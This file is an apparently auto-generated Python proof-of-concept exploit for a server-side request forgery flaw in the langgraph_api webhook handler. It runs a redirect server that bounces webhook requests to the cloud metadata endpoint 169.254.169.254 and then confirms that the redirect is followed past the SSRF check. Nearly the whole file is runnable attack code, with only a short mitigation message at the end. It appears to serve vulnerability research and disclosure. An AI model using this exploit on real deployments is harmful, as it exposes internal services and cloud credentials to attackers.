#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: ssrf-025
# Sink: ssrf_safe_async_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_ssrf_safe_async_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api webhook handler.

Vulnerability: The webhook URL is validated before the initial request, but
redirects are followed without re-validation. An attacker can host a webhook
that redirects to internal IPs (e.g., 169.254.169.254), bypassing the SSRF-safe
transport which only checks the initial connection IP.

This PoC demonstrates the attack by:
1. Starting a local HTTP server that returns a redirect to an internal IP
2. Triggering the vulnerable webhook call with the attacker-controlled URL
3. Observing that the redirect is followed to the internal IP

Requirements: Python 3.7+, httpx (for the actual exploit), http.server (for PoC server)
"""

import argparse
import http.server
import json
import logging
import socket
import sys
import threading
import time
import urllib.parse
from typing import Optional

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Default configuration
DEFAULT_LISTEN_HOST = '0.0.0.0'
DEFAULT_LISTEN_PORT = 8888
DEFAULT_TARGET_INTERNAL_IP = '169.254.169.254'  # AWS/GCP metadata IP
DEFAULT_TARGET_INTERNAL_PORT = 80
DEFAULT_REDIRECT_PATH = '/latest/meta-data/'  # Common metadata path

class RedirectHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that returns a 302 redirect to an internal IP."""
    
    def do_GET(self):
        """Handle GET requests by returning a redirect."""
        self.send_response(302)
        redirect_url = f"http://{self.server.target_host}:{self.server.target_port}{self.server.target_path}"
        self.send_header('Location', redirect_url)
        self.end_headers()
        logger.info(f"Redirected to: {redirect_url}")
    
    def do_POST(self):
        """Handle POST requests (webhooks are POST) by returning a redirect."""
        self.do_GET()
    
    def log_message(self, format, *args):
        """Suppress default logging to avoid clutter."""
        logger.debug(f"Redirect server: {format % args}")

class RedirectServer:
    """Simple HTTP server that redirects all requests to a target internal IP."""
    
    def __init__(self, host: str = DEFAULT_LISTEN_HOST, port: int = DEFAULT_LISTEN_PORT,
                 target_host: str = DEFAULT_TARGET_INTERNAL_IP,
                 target_port: int = DEFAULT_TARGET_INTERNAL_PORT,
                 target_path: str = DEFAULT_REDIRECT_PATH):
        self.host = host
        self.port = port
        self.target_host = target_host
        self.target_port = target_port
        self.target_path = target_path
        self.server: Optional[http.server.HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
    
    def start(self):
        """Start the redirect server in a background thread."""
        self.server = http.server.HTTPServer((self.host, self.port), RedirectHandler)
        self.server.target_host = self.target_host
        self.server.target_port = self.target_port
        self.server.target_path = self.target_path
        
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        logger.info(f"Redirect server started on http://{self.host}:{self.port}")
        logger.info(f"Redirecting to http://{self.target_host}:{self.target_port}{self.target_path}")
    
    def stop(self):
        """Stop the redirect server."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            logger.info("Redirect server stopped")
    
    def get_webhook_url(self) -> str:
        """Get the URL that should be used as the webhook."""
        return f"http://{self.host}:{self.port}/webhook"

def check_internal_reachability(target_host: str, target_port: int, timeout: float = 2.0) -> bool:
    """
    Check if the internal target is reachable (for verification purposes).
    This is optional and only used to confirm the vulnerability exists.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target_host, target_port))
        sock.close()
        if result == 0:
            logger.info(f"Internal target {target_host}:{target_port} is reachable")
            return True
        else:
            logger.info(f"Internal target {target_host}:{target_port} is not reachable (expected in sandbox)")
            return False
    except Exception as e:
        logger.warning(f"Could not check internal reachability: {e}")
        return False

def simulate_exploit(webhook_url: str, timeout: float = 5.0) -> bool:
    """
    Simulate the vulnerable webhook call.
    
    This mimics what langgraph_api does:
    1. Validate the webhook URL (we skip this for the PoC)
    2. Create an HTTP client with follow_redirects=True
    3. Make a POST request to the webhook URL
    
    The key vulnerability: redirects are followed without re-validation.
    """
    try:
        import httpx
    except ImportError:
        logger.error("httpx is required for this PoC. Install with: pip install httpx")
        return False
    
    logger.info(f"Simulating webhook call to: {webhook_url}")
    logger.info("This will follow redirects to internal IPs (bypassing SSRF protection)")
    
    try:
        # Create client with follow_redirects=True (same as vulnerable code)
        with httpx.Client(follow_redirects=True, max_redirects=5, timeout=timeout) as client:
            # Make the POST request (same as http_request in langgraph_api)
            response = client.post(webhook_url, json={"test": "payload"})
            
            logger.info(f"Response status: {response.status_code}")
            logger.info(f"Response headers: {dict(response.headers)}")
            logger.info(f"Response body (first 500 chars): {response.text[:500]}")
            
            # Check if we reached the internal target
            if response.status_code == 200:
                logger.info("SUCCESS: Redirect was followed to internal target!")
                logger.info("Vulnerability confirmed: SSRF-safe transport bypassed via redirect")
                return True
            else:
                logger.info(f"Redirect was followed but got status {response.status_code}")
                return True  # Still demonstrates the redirect bypass
                
    except httpx.ConnectError as e:
        logger.error(f"Connection error (expected if internal target is blocked): {e}")
        logger.info("The redirect was attempted but the internal target may be blocked by network policy")
        return False
    except httpx.TimeoutException as e:
        logger.error(f"Timeout (expected if internal target is slow or blocked): {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return False

def main():
    """Main function to run the PoC."""
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api webhook handler"
    )
    parser.add_argument('--listen-host', default=DEFAULT_LISTEN_HOST,
                        help=f"Host to listen on (default: {DEFAULT_LISTEN_HOST})")
    parser.add_argument('--listen-port', type=int, default=DEFAULT_LISTEN_PORT,
                        help=f"Port to listen on (default: {DEFAULT_LISTEN_PORT})")
    parser.add_argument('--target-host', default=DEFAULT_TARGET_INTERNAL_IP,
                        help=f"Internal target IP (default: {DEFAULT_TARGET_INTERNAL_IP})")
    parser.add_argument('--target-port', type=int, default=DEFAULT_TARGET_INTERNAL_PORT,
                        help=f"Internal target port (default: {DEFAULT_TARGET_INTERNAL_PORT})")
    parser.add_argument('--target-path', default=DEFAULT_REDIRECT_PATH,
                        help=f"Internal target path (default: {DEFAULT_REDIRECT_PATH})")
    parser.add_argument('--timeout', type=float, default=5.0,
                        help="Timeout for HTTP requests (default: 5.0)")
    parser.add_argument('--no-check', action='store_true',
                        help="Skip internal reachability check")
    
    args = parser.parse_args()
    
    logger.info("=" * 60)
    logger.info("SSRF via Redirect Bypass - Proof of Concept")
    logger.info("=" * 60)
    logger.info(f"Target internal IP: {args.target_host}:{args.target_port}{args.target_path}")
    
    # Check if internal target is reachable (optional)
    if not args.no_check:
        check_internal_reachability(args.target_host, args.target_port)
    
    # Start the redirect server
    redirect_server = RedirectServer(
        host=args.listen_host,
        port=args.listen_port,
        target_host=args.target_host,
        target_port=args.target_port,
        target_path=args.target_path
    )
    
    try:
        redirect_server.start()
        time.sleep(0.5)  # Give server time to start
        
        webhook_url = redirect_server.get_webhook_url()
        logger.info(f"Webhook URL to use: {webhook_url}")
        logger.info("")
        logger.info("In a real attack, this URL would be stored in the database")
        logger.info("and the vulnerable code would call it without re-validating redirects")
        logger.info("")
        
        # Simulate the exploit
        success = simulate_exploit(webhook_url, timeout=args.timeout)
        
        if success:
            logger.info("")
            logger.info("=" * 60)
            logger.info("VULNERABILITY CONFIRMED: SSRF via redirect bypass works!")
            logger.info("=" * 60)
            logger.info("")
            logger.info("Mitigation: Disable redirect following or re-validate redirect targets")
            logger.info("In httpx: follow_redirects=False or implement redirect validation")
        else:
            logger.info("")
            logger.info("Exploit attempt completed (may not have reached internal target)")
            logger.info("This could be due to network restrictions in the test environment")
            
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    finally:
        redirect_server.stop()

if __name__ == "__main__":
    main()
